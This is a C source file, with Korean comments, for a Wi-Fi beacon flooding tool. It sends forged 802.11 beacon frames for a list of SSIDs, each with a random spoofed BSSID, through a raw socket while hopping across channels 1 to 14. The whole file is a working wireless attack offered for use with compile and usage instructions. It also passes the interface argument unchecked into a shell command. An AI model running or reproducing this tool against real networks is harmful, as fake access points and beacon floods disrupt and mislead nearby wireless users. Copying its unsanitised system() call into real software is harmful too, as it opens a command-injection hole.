/******************************************************************************
 *  Compile:  gcc -o mdk_s mdk_s.c -lpthread
 *  Usage:    sudo ./mdk_s <interface> <ssid_list_file>
 *  Example:  sudo ./mdk_s mon0 ssid-list.txt
 *****************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <netinet/in.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

#define MAX_CHANNEL         14         // 최대 채널 개수
#define HOP_INTERVAL_US     300000     // 채널 변경 간격 (300ms)
#define PACKET_INTERVAL_US  1000       // 각 Beacon 전송 간격 (1ms)
#define MAX_SSID_LIST       1024       // 최대 SSID 개수
#define MAX_SSID_LEN        32         // SSID 최대 길이

// 전역 변수 선언
static char g_iface[IFNAMSIZ] = {0}; // 무선 인터페이스 이름
static volatile int g_stop_hopping = 0;      // 채널 호핑 중지 플래그 (volatile: signal handler에서 변경)
static volatile int g_current_channel = 1;   // 현재 채널

static char g_ssid_list[MAX_SSID_LIST][MAX_SSID_LEN + 1]; // SSID 목록
static int g_ssid_count = 0; 

static unsigned char g_bssid_list[MAX_SSID_LIST][6]; // 각 SSID에 대한 랜덤 BSSID 목록
static unsigned short g_seqnum = 0; // 802.11 시퀀스 번호

// 종료 시그널 핸들러 (SIGINT)
void handle_signal(int signo) {
    if(signo == SIGINT) {
        g_stop_hopping = 1;
        printf("\nSIGINT received. Stopping beacon flood...\n");
    }
}

// 랜덤 BSSID 생성 (로컬 관리 비트 1, 멀티캐스트 비트 0)
static void generate_random_mac(unsigned char mac[6]) {
    static int seed_init = 0;
    if (!seed_init) {
        srand((unsigned int)time(NULL));
        seed_init = 1;
    }
    mac[0] = 0x02;  // Locally administered, unicast
    mac[1] = rand() & 0xFF;
    mac[2] = rand() & 0xFF;
    mac[3] = rand() & 0xFF;
    mac[4] = rand() & 0xFF;
    mac[5] = rand() & 0xFF;
}

// 802.11 Beacon Frame 생성
// radiotap_header + beacon_header + fixed parameters + SSID tag + Supported Rates + Extended Rates + DS tag
int build_beacon_frame(unsigned char *buf, const char *ssid, const unsigned char bssid[6], int channel) {
    // Radiotap 헤더 (간단 버전)
    unsigned char radiotap_header[] = {
        0x00, 0x00, 0x0c, 0x00,   // 버전 및 헤더 길이 (12바이트)
        0x04, 0x80, 0x00, 0x00,   // 인터페이스 정보
        0x00, 0x02, 0x6c, 0x09    // 추가 필드 (예: 채널, RSSI 등)
    };

    // 802.11 Beacon 헤더 (24바이트)
    unsigned char beacon_header[24] = {
        0x80, 0x00,             // Frame Control (Beacon)
        0x00, 0x00,             // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination Address (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (BSSID; 설정할 예정)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (동일)
        0x00, 0x00              // Sequence Control
    };

    // BSSID 설정 (SA와 BSSID 필드 동일하게 설정)
    memcpy(&beacon_header[10], bssid, 6);
    memcpy(&beacon_header[16], bssid, 6);
    // 시퀀스 번호 설정 (Sequence Control 필드: 2바이트)
    beacon_header[22] = (g_seqnum & 0x00FF);
    beacon_header[23] = ((g_seqnum >> 8) & 0x0F);
    g_seqnum++;

    // Fixed Parameters (12바이트): Timestamp(8), Beacon Interval(2), Capabilities(2)
    unsigned char fixed_params[] = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (0)
        0x64, 0x00,                                     // Beacon Interval (0x0064 = 100 TU)
        0x31, 0x04                                      // Capabilities: ESS, Privacy 등 (예)
    };

    // SSID Tag : Tag Number (0), Length, SSID Data
    unsigned char ssid_tag[2 + MAX_SSID_LEN];
    ssid_tag[0] = 0x00;  // Tag Number 0: SSID Parameter Set
    size_t ssid_len = strlen(ssid);
    if (ssid_len > MAX_SSID_LEN)
        ssid_len = MAX_SSID_LEN;
    ssid_tag[1] = (unsigned char)ssid_len;
    memcpy(&ssid_tag[2], ssid, ssid_len);

    // Supported Rates Tag : Tag Number 1, Length 4, Data (예: 1, 2, 5.5, 11 Mbps)
    unsigned char rate_tag[] = { 0x01, 0x04, 0x02, 0x04, 0x0B, 0x16 };
    // Extended Supported Rates Tag : Tag Number 50 (0x32), Length 8, Data (예: 6,9,12,18,24,36,48,54 Mbps)
    unsigned char ext_rate_tag[] = { 0x32, 0x08, 0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c };
    // DS Parameter Set Tag : Tag Number 3, Length 1, Data = current channel
    unsigned char ds_tag[] = { 0x03, 0x01, (unsigned char)channel };

    int pos = 0;
    // 순차적으로 각 프레임 영역을 버퍼에 복사
    memcpy(buf + pos, radiotap_header, sizeof(radiotap_header));
    pos += sizeof(radiotap_header);
    
    memcpy(buf + pos, beacon_header, sizeof(beacon_header));
    pos += sizeof(beacon_header);
    
    memcpy(buf + pos, fixed_params, sizeof(fixed_params));
    pos += sizeof(fixed_params);
    
    memcpy(buf + pos, ssid_tag, 2 + ssid_len);
    pos += (2 + ssid_len);
    
    memcpy(buf + pos, rate_tag, sizeof(rate_tag));
    pos += sizeof(rate_tag);
    
    memcpy(buf + pos, ext_rate_tag, sizeof(ext_rate_tag));
    pos += sizeof(ext_rate_tag);
    
    memcpy(buf + pos, ds_tag, sizeof(ds_tag));
    pos += sizeof(ds_tag);

    return pos; // 최종 프레임 길이 반환
}

// 채널 호핑 쓰레드 함수: 일정 간격으로 채널 변경
void *channel_hopper(void *arg) {
    int channel = 1;
    char cmd[128];

    while (!g_stop_hopping) {
        snprintf(cmd, sizeof(cmd), "iw dev %s set channel %d", g_iface, channel);
        system(cmd);
        g_current_channel = channel;
        channel = (channel % MAX_CHANNEL) + 1;
        usleep(HOP_INTERVAL_US);
    }
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // 인자 확인: interface와 ssid list 파일
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <interface> <ssid_list_file>\n", argv[0]);
        return -1;
    }

    strncpy(g_iface, argv[1], IFNAMSIZ - 1);

    // 시그널 핸들러 등록 (CTRL+C 처리)
    if (signal(SIGINT, handle_signal) == SIG_ERR) {
        perror("signal");
        return -1;
    }

    // SSID 목록 파일 읽기
    FILE *fp = fopen(argv[2], "r");
    if (!fp) {
        perror("fopen list file");
        return -1;
    }
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        char *p = strchr(line, '\n');
        if (p) *p = '\0';
        if (strlen(line) > 0) {
            strncpy(g_ssid_list[g_ssid_count], line, MAX_SSID_LEN);
            g_ssid_list[g_ssid_count][MAX_SSID_LEN] = '\0';
            g_ssid_count++;
            if (g_ssid_count >= MAX_SSID_LIST) break;
        }
    }
    fclose(fp);

    if (g_ssid_count == 0) {
        fprintf(stderr, "No SSID to broadcast. Check %s\n", argv[2]);
        return -1;
    }

    printf("Loaded %d SSIDs from %s\n", g_ssid_count, argv[2]);

    // 각 SSID에 대응되는 랜덤 BSSID 생성
    for (int i = 0; i < g_ssid_count; i++) {
        generate_random_mac(g_bssid_list[i]);
    }

    // RAW 소켓 생성
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }

    // 채널 호핑 쓰레드 시작
    pthread_t tid;
    if (pthread_create(&tid, NULL, channel_hopper, NULL) != 0) {
        perror("pthread_create");
        close(sockfd);
        return -1;
    }

    unsigned char packet[1024];
    int packet_len;
    // Beacon Flooding 메인 루프
    while (!g_stop_hopping) {
        for (int i = 0; i < g_ssid_count; i++) {
            // 각 SSID에 대해 Beacon 프레임 생성 (현재 채널 반영)
            packet_len = build_beacon_frame(packet, g_ssid_list[i], g_bssid_list[i], g_current_channel);
            if (packet_len > 0) {
                int ret = sendto(sockfd, packet, packet_len, 0, NULL, 0);
                if (ret < 0) {
                    perror("sendto");
                    // 심각한 오류 발생 시 루프 종료
                    g_stop_hopping = 1;
                    break;
                }
            }
            usleep(PACKET_INTERVAL_US);
        }
        // 진행상황 출력 (실시간 업데이트)
        printf("\r[ Channel: %2d | SSIDs Flooded: %d ]", g_current_channel, g_ssid_count);
        fflush(stdout);
    }
    printf("\nStopping beacon flood and cleaning up...\n");

    // 채널 호핑 쓰레드 종료 대기
    pthread_join(tid, NULL);
    close(sockfd);

    return 0;
}
